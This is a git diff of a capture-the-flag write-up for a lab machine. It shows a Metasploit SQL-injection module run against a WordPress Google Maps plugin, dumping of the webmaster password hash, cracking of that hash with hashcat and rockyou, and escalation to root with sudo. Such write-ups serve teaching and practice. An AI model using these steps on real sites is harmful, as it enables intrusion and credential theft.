@@ -214,13 +214,8 @@ Interesting Finding(s):
 
 ```
 $ msfconsole
-```
-
-```
 msf5 > search google_maps
-```
 
-```
 Matching Modules
 ================
 
@@ -256,7 +251,7 @@ msf5 auxiliary(admin/http/wp_google_maps_sqli) > exploit
 [*] Auxiliary module execution completed
 ```
 
-Credentials: **webmaster $P$Bsq0diLTcye6ASlofreys4GzRlRvSrl**
+Credentials: **webmaster** : **$P$Bsq0diLTcye6ASlofreys4GzRlRvSrl**
 
 ### Credentials Cracking
 
@@ -265,9 +260,7 @@ $ cat credentials.txt
 $P$Bsq0diLTcye6ASlofreys4GzRlRvSrl
 
 $ hashcat -m 400 ~/Desktop/credentials.txt /usr/share/wordlists/rockyou.txt
-```
 
-```
 $P$BsqOdiLTcye6AS1ofreys4GzRlRvSr1:kittykat1
 
 Session..........: hashcat
@@ -361,7 +354,6 @@ Password: kittykat1
 
 webmaster@HF2019-Linux:~$ sudo su
 root@HF2019-Linux:/home/webmaster#
-
 ```
 
 ### Flag Acquiring
